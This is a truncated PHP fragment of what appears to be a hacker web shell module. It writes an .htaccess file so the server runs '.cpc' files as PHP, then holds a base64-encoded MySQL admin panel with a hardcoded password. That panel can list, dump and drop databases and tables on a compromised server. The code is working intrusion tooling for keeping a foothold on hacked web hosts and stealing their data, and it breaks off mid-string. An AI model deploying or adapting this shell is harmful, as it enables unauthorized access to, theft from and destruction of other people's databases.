<form action="?y=<?php echo $pwd; ?>&amp;x=sql" method="post">
<?php
echo "<center/><br/><b><font color=#00ff00>+--==[ Mysql Interface ]==--+</font></b><br><br>";
  mkdir('mysql', 0755);
    chdir('mysql');
        $akses = ".htaccess";
        $buka_lah = "$akses";
        $buka = fopen ($buka_lah , 'w') or die ("Error cuyy!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-php .cpc
";    
        fwrite ( $buka , $metin ) ;
        fclose ($buka);
$sqlshell = 'PD8NCiRQQVNTV09SRCA9ICJyb290X3hoYWhheCI7DQokVVNFUk5BTUUgPSAieGhhaGF4IjsNCmlmICggZnVuY3Rpb25fZXhpc3RzKCdpbmlfZ2V0JykgKSB7DQoJJG9ub2ZmID0gaW5pX2dldCgncmVnaXN0ZXJfZ2xvYmFscycpOw0KfSBlbHNlIHsNCgkkb25vZmYgPSBnZXRfY2ZnX3ZhcigncmVnaXN0ZXJfZ2xvYmFscycpOw0KfQ0KaWYgKCRvbm9mZiAhPSAxKSB7DQoJQGV4dHJhY3QoJEhUVFBfU0VSVkVSX1ZBUlMsIEVYVFJfU0tJUCk7DQoJQGV4dHJhY3QoJEhUVFBfQ09PS0lFX1ZBUlMsIEVYVFJfU0tJUCk7DQoJQGV4dHJhY3QoJEhUVFBfUE9TVF9GSUxFUywgRVhUUl9TS0lQKTsNCglAZXh0cmFjdCgkSFRUUF9QT1NUX1ZBUlMsIEVYVFJfU0tJUCk7DQoJQGV4dHJhY3QoJEhUVFBfR0VUX1ZBUlMsIEVYVFJfU0tJUCk7DQoJQGV4dHJhY3QoJEhUVFBfRU5WX1ZBUlMsIEVYVFJfU0tJUCk7DQp9DQoNCmZ1bmN0aW9uIGxvZ29uKCkgew0KCWdsb2JhbCAkUEhQX1NFTEY7DQoJc2V0Y29va2llKCAibXlzcWxfd2ViX2FkbWluX3VzZXJuYW1lIiApOw0KCXNldGNvb2tpZSggIm15c3FsX3dlYl9hZG1pbl9wYXNzd29yZCIgKTsNCglzZXRjb29raWUoICJteXNxbF93ZWJfYWRtaW5faG9zdG5hbWUiICk7DQoJZWNobyAiPHRhYmxlIHdpZHRoPTEwMCUgaGVpZ2h0PTEwMCU+PHRyPjx0ZD48Y2VudGVyPlxuIjsNCgllY2hvICI8dGFibGUgY2VsbHBhZGRpbmc9Mj48dHI+PHRkPjxjZW50ZXI+XG4iOw0KCWVjaG8gIjx0YWJsZSBjZWxscGFkZGluZz0yMD48dHI+PHRkPjxjZW50ZXI+XG4iOw0KCWVjaG8gIjxoMT5NeVNRTCBJbnRlcmZhY2UgQnkgUzRNUDRIPC9oMT5cbiI7DQoJZWNobyAiPGZvcm0gYWN0aW9uPSckUEhQX1NFTEYnPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hY3Rpb24gdmFsdWU9Ykc5bmIyNWZjM1ZpYldsMD5cbiI7DQoJZWNobyAiPHRhYmxlIGNlbGxwYWRkaW5nPTUgY2VsbHNwYWNpbmc9MT5cbiI7DQoJZWNobyAiPHRyPjx0ZCBjbGFzcz1cIm5ld1wiPkhvc3RuYW1lIDwvdGQ+PHRkPiA8aW5wdXQgdHlwZT10ZXh0IG5hbWU9aG9zdG5hbWUgdmFsdWU9J2xvY2FsaG9zdCc+PC90ZD48L3RyPlxuIjsNCgllY2hvICI8dHI+PHRkIGNsYXNzPVwibmV3XCI+VXNlcm5hbWUgPC90ZD48dGQ+IDxpbnB1dCB0eXBlPXRleHQgbmFtZT11c2VybmFtZT48L3RkPjwvdHI+XG4iOw0KCWVjaG8gIjx0cj48dGQgY2xhc3M9XCJuZXdcIj5QYXNzd29yZCA8L3RkPjx0ZD4gPGlucHV0IHR5cGU9cGFzc3dvcmQgbmFtZT1wYXNzd29yZD48L3RkPjwvdHI+XG4iOw0KCWVjaG8gIjwvdGFibGU+PHA+XG4iOw0KCWVjaG8gIjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nRW50ZXInPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1yZXNldCB2YWx1ZT0nQ2xlYXInPjxicj5cbiI7DQoJZWNobyAiPC9mb3JtPlxuIjsNCgllY2hvICI8L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT5cbiI7DQoJZWNobyAiPC9jZW50ZXI+PC90ZD48L3RyPjwvdGFibGU+XG4iOw0KCWVjaG8gIjxwPjxociB3aWR0aD0zMDA+XG4iOw0KCWVjaG8gIjwvY2VudGVyPjwvdGQ+PC90cj48L3RhYmxlPlxuIjsNCn0NCg0KZnVuY3Rpb24gbG9nb25fc3VibWl0KCkgew0KCWdsb2JhbCAkdXNlcm5hbWUsICRwYXNzd29yZCwgJGhvc3RuYW1lICwkUEhQX1NFTEY7DQoJaWYoJGhvc3RuYW1lID09JycpDQoJCSRob3N0bmFtZSA9ICdsb2NhbGhvc3QnOw0KCXNldGNvb2tpZSggIm15c3FsX3dlYl9hZG1pbl91c2VybmFtZSIsICR1c2VybmFtZSApOw0KCXNldGNvb2tpZSggIm15c3FsX3dlYl9hZG1pbl9wYXNzd29yZCIsICRwYXNzd29yZCApOw0KCXNldGNvb2tpZSggIm15c3FsX3dlYl9hZG1pbl9ob3N0bmFtZSIsICRob3N0bmFtZSApOw0KCWVjaG8gIjxNRVRBIEhUVFAtRVFVSVY9UmVmcmVzaCBDT05URU5UPScwOyBVUkw9JFBIUF9TRUxGP2FjdGlvbj1iR2x6ZEVSQ2N3PT0nPiI7DQp9DQoNCmZ1bmN0aW9uIGVjaG9RdWVyeVJlc3VsdCgpIHsNCglnbG9iYWwgJHF1ZXJ5U3RyLCAkZXJyTXNnOw0KCWlmKCAkZXJyTXNnID09ICIiICkgJGVyck1zZyA9ICJTdWNjZXNzIjsNCglpZiggJHF1ZXJ5U3RyICE9ICIiICkgew0KCQllY2hvICI8dGFibGUgY2VsbHBhZGRpbmc9NT5cbiI7DQoJCWVjaG8gIjx0cj48dGQ+UXVlcnk8L3RkPjx0ZD4kcXVlcnlTdHI8L3RkPjwvdHI+XG4iOw0KCQllY2hvICI8dHI+PHRkPlJlc3VsdDwvdGQ+PHRkPiRlcnJNc2c8L3RkPjwvdHI+XG4iOw0KCQllY2hvICI8L3RhYmxlPjxwPlxuIjsNCgl9DQp9DQoNCmZ1bmN0aW9uIGxpc3REYXRhYmFzZXMoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJFBIUF9TRUxGOw0KCWVjaG8gIjxoMT5EYXRhYmFzZXMgTGlzdDwvaDE+XG4iOw0KCWVjaG8gIjxmb3JtIGFjdGlvbj0nJFBIUF9TRUxGJz5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YWN0aW9uIHZhbHVlPWNyZWF0ZURCPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT10ZXh0IG5hbWU9ZGJuYW1lPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NyZWF0ZSBEYXRhYmFzZSc+XG4iOw0KCWVjaG8gIjwvZm9ybT5cbiI7DQoJZWNobyAiPGhyPlxuIjsNCgllY2hvICI8dGFibGUgY2VsbHNwYWNpbmc9MSBjZWxscGFkZGluZz01PlxuIjsNCgkkcERCID0gbXlzcWxfbGlzdF9kYnMoICRteXNxbEhhbmRsZSApOw0KCSRudW0gPSBteXNxbF9udW1fcm93cyggJHBEQiApOw0KCWZvciggJGkgPSAwOyAkaSA8ICRudW07ICRpKysgKSB7DQoJCSRkYm5hbWUgPSBteXNxbF9kYm5hbWUoICRwREIsICRpICk7DQoJCWVjaG8gIjx0cj5cbiI7DQoJCWVjaG8gIjx0ZD4kZGJuYW1lPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD48YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPWxpc3RUYWJsZXMmZGJuYW1lPSRkYm5hbWUnPlRhYmxlczwvYT48L3RkPlxuIjsNCgkJZWNobyAiPHRkPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZHJvcERCJmRibmFtZT0kZGJuYW1lJyBvbkNsaWNrPVwicmV0dXJuIGNvbmZpcm0oJ0Ryb3AgRGF0YWJhc2UgXCckZGJuYW1lXCc/JylcIj5Ecm9wPC9hPjwvdGQ+XG4iOw0KCQllY2hvICI8dGQ+PGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1kdW1wREImZGJuYW1lPSRkYm5hbWUnIG9uQ2xpY2s9XCJyZXR1cm4gY29uZmlybSgnRHVtcCBEYXRhYmFzZSBcJyRkYm5hbWVcJz8nKVwiPkR1bXA8L2E+PC90ZD5cbiI7DQoJCWVjaG8gIjwvdHI+XG4iOw0KCX0NCgllY2hvICI8L3RhYmxlPlxuIjsNCn0NCg0KZnVuY3Rpb24gY3JlYXRlRGF0YWJhc2UoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJFBIUF9TRUxGOw0KCW15c3FsX2NyZWF0ZV9kYiggJGRibmFtZSwgJG15c3FsSGFuZGxlICk7DQoJbGlzdERhdGFiYXNlcygpOw0KfQ0KDQpmdW5jdGlvbiBkcm9wRGF0YWJhc2UoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJFBIUF9TRUxGOw0KCW15c3FsX2Ryb3BfZGIoICRkYm5hbWUsICRteXNxbEhhbmRsZSApOw0KCWxpc3REYXRhYmFzZXMoKTsNCn0NCg0KZnVuY3Rpb24gbGlzdFRhYmxlcygpIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkZGJuYW1lLCAkUEhQX1NFTEY7DQoJZWNobyAiPGgxPlRhYmxlcyBMaXN0PC9oMT5cbiI7DQoJZWNobyAiPHAgY2xhc3M9bG9jYXRpb24+JGRibmFtZTwvcD5cbiI7DQoJZWNob1F1ZXJ5UmVzdWx0KCk7DQoJZWNobyAiPGZvcm0gYWN0aW9uPSckUEhQX1NFTEYnPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hY3Rpb24gdmFsdWU9Y3JlYXRlVGFibGU+XG4iOw0KCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWRibmFtZSB2YWx1ZT0kZGJuYW1lPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT10ZXh0IG5hbWU9dGFibGVuYW1lPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NyZWF0ZSBUYWJsZSc+XG4iOw0KCWVjaG8gIjwvZm9ybT5cbiI7DQoJZWNobyAiPGZvcm0gYWN0aW9uPSckUEhQX1NFTEYnPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hY3Rpb24gdmFsdWU9cXVlcnk+XG4iOw0KCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWRibmFtZSB2YWx1ZT0kZGJuYW1lPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT10ZXh0IHNpemU9MTIwIG5hbWU9cXVlcnlTdHI+XG4iOw0KCWVjaG8gIjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nUXVlcnknPlxuIjsNCgllY2hvICI8L2Zvcm0+XG4iOw0KCWVjaG8gIjxocj5cbiI7DQoJJHBUYWJsZSA9IG15c3FsX2xpc3RfdGFibGVzKCAkZGJuYW1lICk7DQoJaWYoICRwVGFibGUgPT0gMCApIHsNCgkJJG1zZyAgPSBteXNxbF9lcnJvcigpOw0KCQllY2hvICI8aDM+RXJyb3IgOiAkbXNnPC9oMz48cD5cbiI7DQoJCXJldHVybjsNCgl9DQoJJG51bSA9IG15c3FsX251bV9yb3dzKCAkcFRhYmxlICk7DQoJZWNobyAiPHRhYmxlIGNlbGxzcGFjaW5nPTEgY2VsbHBhZGRpbmc9NT5cbiI7DQoJZm9yKCAkaSA9IDA7ICRpIDwgJG51bTsgJGkrKyApIHsNCgkJJHRhYmxlbmFtZSA9IG15c3FsX3RhYmxlbmFtZSggJHBUYWJsZSwgJGkgKTsNCgkJZWNobyAiPHRyPlxuIjsNCgkJZWNobyAiPHRkPlxuIjsNCgkJZWNobyAiJHRhYmxlbmFtZVxuIjsNCgkJZWNobyAiPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD5cbiI7DQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dmlld1NjaGVtYSZkYm5hbWU9JGRibmFtZSZ0YWJsZW5hbWU9JHRhYmxlbmFtZSc+U2NoZW1hPC9hPlxuIjsNCgkJZWNobyAiPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD5cbiI7DQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZG1sbGQwUmhkR0U9JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJz5EYXRhPC9hPlxuIjsNCgkJZWNobyAiPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD5cbiI7DQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZHJvcFRhYmxlJmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJyBvbkNsaWNrPVwicmV0dXJuIGNvbmZpcm0oJ0Ryb3AgVGFibGUgXCckdGFibGVuYW1lXCc/JylcIj5Ecm9wPC9hPlxuIjsNCgkJZWNobyAiPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD5cbiI7DQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZHVtcFRhYmxlJmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJyBvbkNsaWNrPVwicmV0dXJuIGNvbmZpcm0oJ0R1bXAgVGFibGUgXCckdGFibGVuYW1lXCc/JylcIj5EdW1wPC9hPlxuIjsNCgkJZWNobyAiPC90ZD5cbiI7DQoJCWVjaG8gIjwvdHI+XG4iOw0KCX0NCgllY2hvICI8L3RhYmxlPiI7DQp9DQoNCmZ1bmN0aW9uIGNyZWF0ZVRhYmxlKCkgew0KDQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJFBIUF9TRUxGLCAkcXVlcnlTdHIsICRlcnJNc2c7DQoJJHF1ZXJ5U3RyID0gIkNSRUFURSBUQUJMRSAkdGFibGVuYW1lICggbm8gSU5UICkiOw0KCW15c3FsX3NlbGVjdF9kYiggJGRibmFtZSwgJG15c3FsSGFuZGxlICk7DQoJbXlzcWxfcXVlcnkoICRxdWVyeVN0ciwgJG15c3FsSGFuZGxlICk7DQoJJGVyck1zZyA9IG15c3FsX2Vycm9yKCk7DQoJbGlzdFRhYmxlcygpOw0KfQ0KDQpmdW5jdGlvbiBkcm9wVGFibGUoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJFBIUF9TRUxGLCAkcXVlcnlTdHIsICRlcnJNc2c7DQoJJHF1ZXJ5U3RyID0gIkRST1AgVEFCTEUgJHRhYmxlbmFtZSI7DQoJbXlzcWxfc2VsZWN0X2RiKCAkZGJuYW1lLCAkbXlzcWxIYW5kbGUgKTsNCglteXNxbF9xdWVyeSggJHF1ZXJ5U3RyLCAkbXlzcWxIYW5kbGUgKTsNCgkkZXJyTXNnID0gbXlzcWxfZXJyb3IoKTsNCglsaXN0VGFibGVzKCk7DQp9DQoNCmZ1bmN0aW9uIHZpZXdTY2hlbWEoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJFBIUF9TRUxGLCAkcXVlcnlTdHIsICRlcnJNc2c7DQoJZWNobyAiPGgxPlRhYmxlIFNjaGVtYTwvaDE+XG4iOw0KCWVjaG8gIjxwIGNsYXNzPWxvY2F0aW9uPiRkYm5hbWUgJmd0OyAkdGFibGVuYW1lPC9wPlxuIjsNCgllY2hvUXVlcnlSZXN1bHQoKTsNCgllY2hvICI8YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPWFkZEZpZWxkJmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJz5BZGQgRmllbGQ8L2E+IHwgXG4iOw0KCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZG1sbGQwUmhkR0U9JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJz5WaWV3IERhdGE8L2E+XG4iOw0KCWVjaG8gIjxocj5cbiI7DQoJJHBSZXN1bHQgPSBteXNxbF9kYl9xdWVyeSggJGRibmFtZSwgIlNIT1cgZmllbGRzIEZST00gJHRhYmxlbmFtZSIgKTsNCgkkbnVtID0gbXlzcWxfbnVtX3Jvd3MoICRwUmVzdWx0ICk7DQoJZWNobyAiPHRhYmxlIGNlbGxzcGFjaW5nPTEgY2VsbHBhZGRpbmc9NT5cbiI7DQoJZWNobyAiPHRyPlxuIjsNCgllY2hvICI8dGg+RmllbGQ8L3RoPlxuIjsNCgllY2hvICI8dGg+VHlwZTwvdGg+XG4iOw0KCWVjaG8gIjx0aD5OdWxsPC90aD5cbiI7DQoJZWNobyAiPHRoPktleTwvdGg+XG4iOw0KCWVjaG8gIjx0aD5EZWZhdWx0PC90aD5cbiI7DQoJZWNobyAiPHRoPkV4dHJhPC90aD5cbiI7DQoJZWNobyAiPHRoIGNvbHNwYW49Mj5BY3Rpb248L3RoPlxuIjsNCgllY2hvICI8L3RyPlxuIjsNCg0KCWZvciggJGkgPSAwOyAkaSA8ICRudW07ICRpKysgKSB7DQoJCSRmaWVsZCA9IG15c3FsX2ZldGNoX2FycmF5KCAkcFJlc3VsdCApOw0KCQllY2hvICI8dHI+XG4iOw0KCQllY2hvICI8dGQ+Ii4kZmllbGRbIkZpZWxkIl0uIjwvdGQ+XG4iOw0KCQllY2hvICI8dGQ+Ii4kZmllbGRbIlR5cGUiXS4iPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD4iLiRmaWVsZFsiTnVsbCJdLiI8L3RkPlxuIjsNCgkJZWNobyAiPHRkPiIuJGZpZWxkWyJLZXkiXS4iPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD4iLiRmaWVsZFsiRGVmYXVsdCJdLiI8L3RkPlxuIjsNCgkJZWNobyAiPHRkPiIuJGZpZWxkWyJFeHRyYSJdLiI8L3RkPlxuIjsNCgkJJGZpZWxkbmFtZSA9ICRmaWVsZFsiRmllbGQiXTsNCgkJZWNobyAiPHRkPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZWRpdEZpZWxkJmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJmZpZWxkbmFtZT0kZmllbGRuYW1lJz5FZGl0PC9hPjwvdGQ+XG4iOw0KCQllY2hvICI8dGQ+PGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1kcm9wRmllbGQmZGJuYW1lPSRkYm5hbWUmdGFibGVuYW1lPSR0YWJsZW5hbWUmZmllbGRuYW1lPSRmaWVsZG5hbWUnIG9uQ2xpY2s9XCJyZXR1cm4gY29uZmlybSgnRHJvcCBGaWVsZCBcJyRmaWVsZG5hbWVcJz8nKVwiPkRyb3A8L2E+PC90ZD5cbiI7DQoJCWVjaG8gIjwvdHI+XG4iOw0KCX0NCgllY2hvICI8L3RhYmxlPlxuIjsNCn0NCg0KZnVuY3Rpb24gbWFuYWdlRmllbGQoICRjbWQgKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJGZpZWxkbmFtZSwgJFBIUF9TRUxGOw0KCWlmKCAkY21kID09ICJhZGQiICkNCgkJZWNobyAiPGgxPkFkZCBGaWVsZDwvaDE+XG4iOw0KCWVsc2UgaWYoICRjbWQgPT0gImVkaXQiICkgew0KCQllY2hvICI8aDE+RWRpdCBGaWVsZDwvaDE+XG4iOw0KCQkkcFJlc3VsdCA9IG15c3FsX2RiX3F1ZXJ5KCAkZGJuYW1lLCAiU0hPVyBmaWVsZHMgRlJPTSAkdGFibGVuYW1lIiApOw0KCQkkbnVtID0gbXlzcWxfbnVtX3Jvd3MoICRwUmVzdWx0ICk7DQoJCWZvciggJGkgPSAwOyAkaSA8ICRudW07ICRpKysgKSB7DQoJCQkkZmllbGQgPSBteXNxbF9mZXRjaF9hcnJheSggJHBSZXN1bHQgKTsNCgkJCWlmKCAkZmllbGRbIkZpZWxkIl0gPT0gJGZpZWxkbmFtZSApIHsNCgkJCQkkZmllbGR0eXBlID0gJGZpZWxkWyJUeXBlIl07DQoJCQkJJGZpZWxka2V5ID0gJGZpZWxkWyJLZXkiXTsNCgkJCQkkZmllbGRleHRyYSA9ICRmaWVsZFsiRXh0cmEiXTsNCgkJCQkkZmllbGRudWxsID0gJGZpZWxkWyJOdWxsIl07DQoJCQkJJGZpZWxkZGVmYXVsdCA9ICRmaWVsZFsiRGVmYXVsdCJdOw0KCQkJCWJyZWFrOw0KCQkJfQ0KCQl9DQoNCgkJJHR5cGUgPSBzdHJ0b2soICRmaWVsZHR5cGUsICIgKCwpXG4iICk7DQoJCWlmKCBzdHJwb3MoICRmaWVsZHR5cGUsICIoIiApICkgew0KCQkJaWYoICR0eXBlID09ICJlbnVtIiB8ICR0eXBlID09ICJzZXQiICkgew0KCQkJCSR2YWx1ZWxpc3QgPSBzdHJ0b2soICIgKClcbiIgKTsNCgkJCX0gZWxzZSB7DQoJCQkJJE0gPSBzdHJ0b2soICIgKCwpXG4iICk7DQoJCQkJaWYoIHN0cnBvcyggJGZpZWxkdHlwZSwgIiwiICkgKQ0KCQkJCQkkRCA9IHN0cnRvayggIiAoLClcbiIgKTsNCgkJCX0NCgkJfQ0KCX0NCg0KCWVjaG8gIjxwIGNsYXNzPWxvY2F0aW9uPiRkYm5hbWUgJmd0OyAkdGFibGVuYW1lPC9wPlxuIjsNCgllY2hvICI8Zm9ybSBhY3Rpb249JFBIUF9TRUxGPlxuIjsNCglpZiggJGNtZCA9PSAiYWRkIiApDQoJCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWFjdGlvbiB2YWx1ZT1hZGRGaWVsZF9zdWJtaXQ+XG4iOw0KCWVsc2UgaWYoICRjbWQgPT0gImVkaXQiICkgew0KCQllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hY3Rpb24gdmFsdWU9ZWRpdEZpZWxkX3N1Ym1pdD5cbiI7DQoJCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPW9sZF9uYW1lIHZhbHVlPSRmaWVsZG5hbWU+XG4iOw0KCX0NCgllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kYm5hbWUgdmFsdWU9JGRibmFtZT5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9dGFibGVuYW1lIHZhbHVlPSR0YWJsZW5hbWU+XG4iOw0KCWVjaG8gIjxoMz5OYW1lPC9oMz5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9dGV4dCBuYW1lPW5hbWUgdmFsdWU9JGZpZWxkbmFtZT48cD5cbiI7DQoJZWNobyAnDQoNCjxoMz5UeXBlPC9oMz4NCjxmb250IHNpemU9MiBjbGFzcz0ibmV3Ij4NCiogYE1cJyBpbmRpY2F0ZXMgdGhlIG1heGltdW0gZGlzcGxheSBzaXplLjxicj4NCiogYERcJyBhcHBsaWVzIHRvIGZsb2F0aW5nLXBvaW50IHR5cGVzIGFuZCBpbmRpY2F0ZXMgdGhlIG51bWJlciBvZiBkaWdpdHMgZm9sbG93aW5nIHRoZSBkZWNpbWFsIHBvaW50Ljxicj4NCjwvZm9udD4NCjx0YWJsZT4NCjx0cj4NCjx0aD5UeXBlPC90aD48dGg+Jm5ic3BNJm5ic3A8L3RoPjx0aD4mbmJzcEQmbmJzcDwvdGg+PHRoPnVuc2lnbmVkPC90aD48dGg+emVyb2ZpbGw8L3RoPjx0aD5iaW5hcnk8L3RoPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IlRJTllJTlQiICc7IGlmKCAkdHlwZSA9PSAidGlueWludCIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+VElOWUlOVCAoLTEyOCB+IDEyNyk8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iU01BTExJTlQiICc7IGlmKCAkdHlwZSA9PSAic21hbGxpbnQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPlNNQUxMSU5UICgtMzI3NjggfiAzMjc2Nyk8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iTUVESVVNSU5UIiAnOyBpZiggJHR5cGUgPT0gIm1lZGl1bWludCIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+TUVESVVNSU5UICgtODM4ODYwOCB+IDgzODg2MDcpPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IklOVCIgJzsgaWYoICR0eXBlID09ICJpbnQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPklOVCAoLTIxNDc0ODM2NDggfiAyMTQ3NDgzNjQ3KTwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJCSUdJTlQiICc7IGlmKCAkdHlwZSA9PSAiYmlnaW50IiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5CSUdJTlQgKC05MjIzMzcyMDM2ODU0Nzc1ODA4IH4gOTIyMzM3MjAzNjg1NDc3NTgwNyk8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iRkxPQVQiICc7IGlmKCAkdHlwZSA9PSAiZmxvYXQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPkZMT0FUPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IkRPVUJMRSIgJzsgaWYoICR0eXBlID09ICJkb3VibGUiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPkRPVUJMRTwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJERUNJTUFMIiAnOyBpZiggJHR5cGUgPT0gImRlY2ltYWwiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPkRFQ0lNQUwoTlVNRVJJQyk8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iREFURSIgJzsgaWYoICR0eXBlID09ICJkYXRlIiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5EQVRFICgxMDAwLTAxLTAxI